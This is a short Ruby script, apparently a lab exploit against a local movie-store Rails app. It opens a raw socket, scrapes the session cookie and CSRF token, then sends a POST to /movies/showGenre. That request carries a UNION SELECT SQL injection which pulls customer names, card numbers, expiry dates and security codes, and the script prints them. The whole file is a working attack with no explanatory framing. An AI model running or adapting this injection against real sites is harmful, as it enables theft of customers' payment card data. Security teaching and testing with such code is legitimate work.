require 'socket'

host = 'localhost'
port = 3000

# send HTTP GET request to /movies/selectGenre.
selectHTTPReq =
  "GET /movies/selectGenre HTTP/1.1\r\n"\
  "Host: #{host}:#{port}\r\n"\
  "Content-Length: 0\r\n"\
  "Connection: close\r\n"\
  "\r\n"
socket = TCPSocket.open(host, port)
socket.print(selectHTTPReq)
selectHTTPRes = socket.read

# Get cookie from response.
cookie_pattern = 'Set-Cookie: '
cookie_value_start = selectHTTPRes.index(cookie_pattern) + cookie_pattern.length
cookie_value_end = cookie_value_start + selectHTTPRes[cookie_value_start..-1].index(';') - 1
cookie = selectHTTPRes[cookie_value_start..cookie_value_end]

# Get authenticity_token from response.
token_pattern = '<input name="authenticity_token" type="hidden" value="'
token_value_start = selectHTTPRes.index(token_pattern) + token_pattern.length
token_value_end = token_value_start + selectHTTPRes[token_value_start..-1].index('=') - 1
token = selectHTTPRes[token_value_start..token_value_end]

# send HTTP POST request to /movies/showGenre
injectedSQL = 'genre=dummy%27+UNION+SELECT+id%2Cid%2Cname%2Ccard_number%2Cexp_year%2Cexp_month%2Csecurity_code+FROM+customers+--'
showHTTPReqBody = "utf8=%E2%9C%93&authenticity_token=#{token}%3D&#{injectedSQL}&commit=Show+Movies";
showHTTPReq =
  "POST /movies/showGenre HTTP/1.1\r\n"\
  "Host: #{host}:#{port}\r\n"\
  "Content-Length: #{showHTTPReqBody.length}\r\n"\
  "Connection: close\r\n"\
  "Cookie: #{cookie}\r\n"\
  "Content-Type: application/x-www-form-urlencoded\r\n"\
  "\r\n"\
  "#{showHTTPReqBody}\r\n" 

socket = TCPSocket.open(host, port)
socket.print(showHTTPReq)
showHTTPRes = socket.read
puts "Result:", showHTTPRes[showHTTPRes.index("</tr>")..-1]
